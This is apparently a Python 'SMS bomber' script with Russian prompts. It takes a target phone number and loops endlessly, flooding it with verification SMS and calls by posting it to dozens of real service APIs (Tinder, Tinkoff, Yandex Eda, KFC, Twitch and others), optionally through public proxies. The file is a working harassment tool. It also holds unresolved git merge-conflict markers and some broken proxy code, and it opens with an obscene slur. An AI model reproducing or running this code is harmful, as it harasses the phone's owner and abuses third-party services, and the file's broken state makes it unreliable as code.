# flexagoon, спасибо за рефакторинг) by lkqas
# кто спиздит код - тот пидор) By lkqas
import os, random, requests, sys, re, string
from termcolor import colored

def net_check():
    try:
        requests.get('https://www.google.com', verify=True)
    except:
        print(colored("Замечен плохой интернет....",'red'))
        print(colored('Возобновите интернет, и перезайдите в бомбер...','red'))
        sys.exit()

<<<<<<< HEAD
=======
def proxy():
    print(colored("Использовать прокси? (y/n)",'green'))
    proxy = input(" >> ")
    if proxy.lower() == "y":
        proxies = generate_proxy()
    else:
        proxies = None

def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    return {"http": proxy, "https": proxy}

>>>>>>> 68647ad299f3d18fada6e68c8b2056450ed07489
def phone_check(phone):
    pat = re.compile(r"79\d{9}")
    if not re.fullmatch(pat, phone):
        print(colored("\nНеверный номер телефона!",'green'))
        sys.exit()

def spam():
<<<<<<< HEAD
	os.system("clear")
	net_check()

	_phone = input(colored("Введите номер для атаки (79xxxxxxxxx)-->>" ,'green'))

	phone_check(_phone)
	
	if _phone[0] == '+':
		_phone = _phone[1:]
	if _phone[0] == '8':
		_phone = '7'+_phone[1:]
	if _phone[0] == '9':
		_phone = '7'+_phone

	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

	iteration = 0
	while True:
		_email = _name+f'{iteration}'+'@gmail.com'
		email = _name+f'{iteration}'+'@gmail.com'
		try:
			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			print('[+] Grab отправлено!')
		except:
			print('[-] Grab не отправлено!')

		try:
			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			print('[+] RuTaxi отправлено!')
		except:
			print('[-] RuTaxi не отправлено!')

		try:
			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			print('[+] BelkaCar отправлено!')
		except:
			print('[-] BelkaCar не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Tinder не отправлено!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			print('[+] Karusel отправлено!')
		except:
			print('[-] Karusel не отправлено!')

		try:
			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			print('[+] Tinkoff отправлено!')
		except Exception as ex:
			print('[-] Tinkoff не отправлено!' + str(ex))

		try:
			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
			print('[+] MTS отправлено!')
		except:
			print('[-] MTS не отправлено!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print('[+] Youla отправлено!')
		except:
			print('[-] Youla не отправлено!')

		try:
			requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
			print('[+] PizzaHut отправлено!')
		except:
			print('[-] PizzaHut не отправлено!')

		try:
			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
			print('[+] Rabota отправлено!')
		except:
			print('[-] Rabota не отправлено!')

		try:
			requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
			print('[+] Rutube отправлено!')
		except:
			print('[-] Rutube не отправлено!')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
			print('[+] Citilink отправлено!')
		except:
			print('[-] Citilink не отправлено!')

		try:
			requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
			print('[+] Smsint отправлено!')
		except:
			print('[-] Smsint не отправлено!')

		try:
			requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
			print('[+] oyorooms отправлено!')
		except:
			print('[-] oyorooms не отправлено!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
			print('[+] MVideo отправлено!')
		except:
			print('[-] MVideo не отправлено!')

		try:
			requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Борис', 'lastName': 'Фромраша', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
			print('[+] newnext отправлено!')
		except:
			print('[-] newnext не отправлено!')

		try:
			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
			print('[+] Sunlight отправлено!')
		except:
			print('[-] Sunlight не отправлено!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			print('[+] alpari отправлено!')
		except:
			print('[-] alpari не отправлено!')

		try:
			requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			print('[+] Invitro отправлено!')
		except:
			print('[-] Invitro не отправлено!')

		try:
			requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			print('[+] Sberbank отправлено!')
		except:
			print('[-] Sberbank не отправлено!')

		try:
			requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
			print('[+] Psbank отправлено!')
		except:
			print('[-] Psbank не отправлено!')

		try:
			requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			print('[+] Beltelcom отправлено!')
		except:
			print('[-] Beltelcom не отправлено!')

		try:
			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
			print('[+] Karusel отправлено!')
		except:
			print('[-] Karusel не отправлено!')

		try:
			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
			print('[+] KFC отправлено!')
		except:
			print('[-] KFC не отправлено!')

		try:
			requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
			print('[+] carsmile отправлено!')
		except:
			print('[-] carsmile не отправлено!')

		try:
			requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
			print('[+] Citilink отправлено!')
		except:
			print('[-] Citilink не отправлено!')

		try:
			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
			print('[+] Delitime отправлено!')
		except:
			print('[-] Delitime не отправлено!')

		try:
			requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
			print('[+] findclone звонок отправлен!')
		except:
			print('[-] findclone не отправлено!')

		try:
			requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			print('[+] Guru отправлено!')
		except:
			print('[-] Guru не отправлено!')

		try:
			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
			print('[+] ICQ отправлено!')
		except:
			print('[-] ICQ не отправлено!')

		try:
			requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
			print('[+] InDriver отправлено!')
		except:
			print('[-] InDriver не отправлено!')

		try:
			requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
			print('[+] Invitro отправлено!')
		except:
			print('[-] Invitro не отправлено!')

		try:
			requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
			print('[+] Pmsm отправлено!')
		except:
			print('[-] Pmsm не отправлено!')

		try:
			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
			print('[+] IVI отправлено!')
		except:
			print('[-] IVI не отправлено!')

		try:
			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
			print('[+] Mail.ru отправлено!')
		except:
			print('[-] Mail.ru не отправлено!')

		try:
			requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			print('[+] MVideo отправлено!')
		except:
			print('[-] MVideo не отправлено!')

		try:
			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
			print('[+] OK отправлено!')
		except:
			print('[-] OK не отправлено!')

		try:
			requests.post('https://plink.tech/register/',json={"phone": _phone})
			print('[+] Plink отправлено!')
		except:
			print('[-] Plink не отправлено!')

		try:
			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
			print('[+] qlean отправлено!')
		except:
			print('[-] qlean не отправлено!')

		try:
			requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
			print('[+] SMSgorod отправлено!')
		except:
			print('[-] SMSgorod не отправлено!')

		try:
			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
			print('[+] Tinder отправлено!')
		except:
			print('[-] Tinder не отправлено!')

		try:
			requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
			print('[+] Twitch отправлено!')
		except:
			print('[-] Twitch не отправлено!')

		try:
			requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
			print('[+] CabWiFi отправлено!')
		except:
			print('[-] CabWiFi не отправлено!')

		try:
			requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
			print('[+] wowworks отправлено!')
		except:
			print('[-] wowworks не отправлено!')

		try:
			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
			print('[+] Eda.Yandex отправлено!')
		except:
			print('[-] Eda.Yandex не отправлено!')

		try:
			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
			print('[+] Youla отправлено!')
		except:
			print('[-] Youla не отправлено!')

		try:
			requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
			print('[+] Alpari отправлено!')
		except:
			print('[-] Alpari не отправлено!')

		try:
			requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
			print('[+] SMS отправлено!')
		except:
			print('[-] Не отправлено!')

		try:
			requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
			print('[+] Delivery отправлено!')
		except:
			print('[-] Delivery не отправлено!')

		try:
			iteration += 1
			print(('{} круг пройден.').format(iteration))
		except:
			break
=======
    os.system("clear")
    net_check()
    proxy()

    phone = input(colored("Введите номер для атаки в формате 79xxxxxxxxx -->>" ,'green'))

    phone_check(phone)

    name = ''.join([random.choice(string.ascii_letters + string.digits ) for n in range(12)])
    password = ''.join([random.choice(string.ascii_letters + string.digits ) for n in range(12)])

    phone9 = phone[1:]
    phoneAresBank = '+'+phone[0]+'('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
    phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]
    phoneOstin = '+'+phone[0]+'+('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
    phonePizzahut = '+'+phone[0]+' ('+phone[1:4]+') '+phone[4:7]+' '+phone[7:9]+' '+phone[9:11]
    phoneGorzdrav = phone[1:4]+') '+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]

    iteration = 0
    while True:
        _email = name+f'{iteration}'+'@gmail.com'
        email = name+f'{iteration}'+'@gmail.com'
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64, proxies=proxies) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
        except:
            print('[-] Grab не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}, proxies=proxies).json()["res"]
            print('[+] RuTaxi отправлено!')
        except:
            print('[-] RuTaxi не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={}, proxies=proxies)
            print('[+] BelkaCar отправлено!')
        except:
            print('[-] BelkaCar не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={}, proxies=proxies)
            print('[+] Tinder отправлено!')
        except:
            print('[-] Tinder не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={}, proxies=proxies)
            print('[+] Karusel отправлено!')
        except:
            print('[-] Karusel не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={}, proxies=proxies)
            print('[+] Tinkoff отправлено!')
        except Exception as ex:
            print('[-] Tinkoff не отправлено!' + str(ex))

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={}, proxies=proxies)
            print('[+] MTS отправлено!')
        except:
            print('[-] MTS не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone}, proxies=proxies)
            print('[+] Youla отправлено!')
        except:
            print('[-] Youla не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'}, proxies=proxies)
            print('[+] PizzaHut отправлено!')
        except:
            print('[-] PizzaHut не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': phone}, proxies=proxies)
            print('[+] Rabota отправлено!')
        except:
            print('[-] Rabota не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone}, proxies=proxies)
            print('[+] Rutube отправлено!')
        except:
            print('[-] Rutube не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/', proxies=proxies)
            print('[+] Citilink отправлено!')
        except:
            print('[-] Citilink не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'}, proxies=proxies)
            print('[+] Smsint отправлено!')
        except:
            print('[-] Smsint не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone9+'&country_code=%2B7&nod=4&locale=en', proxies=proxies)
            print('[+] oyorooms отправлено!')
        except:
            print('[-] oyorooms не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'}, proxies=proxies)
            print('[+] MVideo отправлено!')
        except:
            print('[-] MVideo не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Борис', 'lastName': 'Фромраша', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'}, proxies=proxies)
            print('[+] newnext отправлено!')
        except:
            print('[-] newnext не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, proxies=proxies)
            print('[+] Sunlight отправлено!')
        except:
            print('[-] Sunlight не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobilephone': phone, 'deliveryOption': 'sms'}, proxies=proxies)
            print('[+] alpari отправлено!')
        except:
            print('[-] alpari не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone}, proxies=proxies)
            print('[+] Invitro отправлено!')
        except:
            print('[-] Invitro не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'}, proxies=proxies)
            print('[+] Sberbank отправлено!')
        except:
            print('[-] Sberbank не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'}, proxies=proxies)
            print('[+] Psbank отправлено!')
        except:
            print('[-] Psbank не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone}, proxies=proxies)
            print('[+] Beltelcom отправлено!')
        except:
            print('[-] Beltelcom не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, proxies=proxies)
            print('[+] Karusel отправлено!')
        except:
            print('[-] Karusel не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone}, proxies=proxies)
            print('[+] KFC отправлено!')
        except:
            print('[-] KFC не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, proxies=proxies)
            print('[+] carsmile отправлено!')
        except:
            print('[-] carsmile не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/', proxies=proxies)
            print('[+] Citilink отправлено!')
        except:
            print('[-] Citilink не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, proxies=proxies)
            print('[+] Delitime отправлено!')
        except:
            print('[-] Delitime не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + phone}, proxies=proxies)
            print('[+] findclone звонок отправлен!')
        except:
            print('[-] findclone не отправлено!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone}}, proxies=proxies)
            print('[+] Guru отправлено!')
        except:
            print('[-] Guru не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxies)
            print('[+] ICQ отправлено!')
        except:
            print('[-] ICQ не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"}, proxies=proxies)
            print('[+] InDriver отправлено!')
        except:
            print('[-] InDriver не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone}, proxies=proxies)
            print('[+] Invitro отправлено!')
        except:
            print('[-] Invitro не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": phone}, proxies=proxies)
            print('[+] Pmsm отправлено!')
        except:
            print('[-] Pmsm не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone}, proxies=proxies)
            print('[+] IVI отправлено!')
        except:
            print('[-] IVI не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"}, proxies=proxies)
            print('[+] Mail.ru отправлено!')
        except:
            print('[-] Mail.ru не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""}, proxies=proxies)
            print('[+] MVideo отправлено!')
        except:
            print('[-] MVideo не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone}, proxies=proxies)
            print('[+] OK отправлено!')
        except:
            print('[-] OK не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": phone}, proxies=proxies)
            print('[+] Plink отправлено!')
        except:
            print('[-] Plink не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone}, proxies=proxies)
            print('[+] qlean отправлено!')
        except:
            print('[-] qlean не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": phone}, proxies=proxies)
            print('[+] SMSgorod отправлено!')
        except:
            print('[-] SMSgorod не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone}, proxies=proxies)
            print('[+] Tinder отправлено!')
        except:
            print('[-] Tinder не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": name}, proxies=proxies)
            print('[+] Twitch отправлено!')
        except:
            print('[-] Twitch не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'}, proxies=proxies)
            print('[+] CabWiFi отправлено!')
        except:
            print('[-] CabWiFi не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2}, proxies=proxies)
            print('[+] wowworks отправлено!')
        except:
            print('[-] wowworks не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, proxies=proxies)
            print('[+] Eda.Yandex отправлено!')
        except:
            print('[-] Eda.Yandex не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone}, proxies=proxies)
            print('[+] Youla отправлено!')
        except:
            print('[-] Youla не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobilephone": phone, "deliveryOption": "sms"}, proxies=proxies)
            print('[+] Alpari отправлено!')
        except:
            print('[-] Alpari не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, proxies=proxies)
            print('[+] SMS отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone}, proxies=proxies)
            print('[+] Delivery отправлено!')
        except:
            print('[-] Delivery не отправлено!')

        try:
            iteration += 1
            print(('{} круг пройден.').format(iteration))
        except:
            break
>>>>>>> 68647ad299f3d18fada6e68c8b2056450ed07489
